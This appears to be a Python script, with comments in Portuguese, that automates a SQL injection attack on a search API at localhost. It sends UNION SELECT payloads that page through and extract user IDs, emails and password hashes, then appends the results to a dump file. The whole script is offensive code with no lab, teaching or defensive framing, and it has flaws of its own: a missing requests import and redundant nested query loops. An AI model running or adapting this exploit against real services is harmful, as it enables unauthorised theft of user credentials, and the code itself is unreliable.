import urllib.parse
import json

def build_sql_query(offset):
    """Construi a string SQL para recuperar hashes de passwords."""
    return "1' UNION SELECT id, email, password FROM USERS OFFSET " + str(offset) + " LIMIT 100--"


def execute_api_search(query_string):
    """Executa uma requisição GET para a API de pesquisa."""
    url = f"http://localhost:8080/api/documents/search?query={urllib.parse.quote(query_string)}"
    response = requests.get(url)

    if response.status_code == 200:
        return json.loads(response.text)
    else:
        raise Exception(f"Erro na requisição GET para API: {response.status_code}")


def dump_data_to_csv(output_filename='recovery_dump.csv', offset=0):
    """Loop iterativo para extrair e salvar dados do JSON."""
    for i in range(5000, 0, -100):  # Loop até o limite de 5000 páginas
        query = build_sql_query(i)  # Construção da query SQL
        response = execute_api_search(query)  # Executando a requisição
        with open(output_filename, 'a') as f:
            json.dump(response, f, indent=2)


if __name__ == "__main__":
    for i in range(0, 5000, 100):  # Iterar por 5000 páginas
        query = build_sql_query(i)  # Construção da query SQL
        response = execute_api_search(query)  # Executando a requisição

        dump_data_to_csv(output_filename='recovery_dump.csv')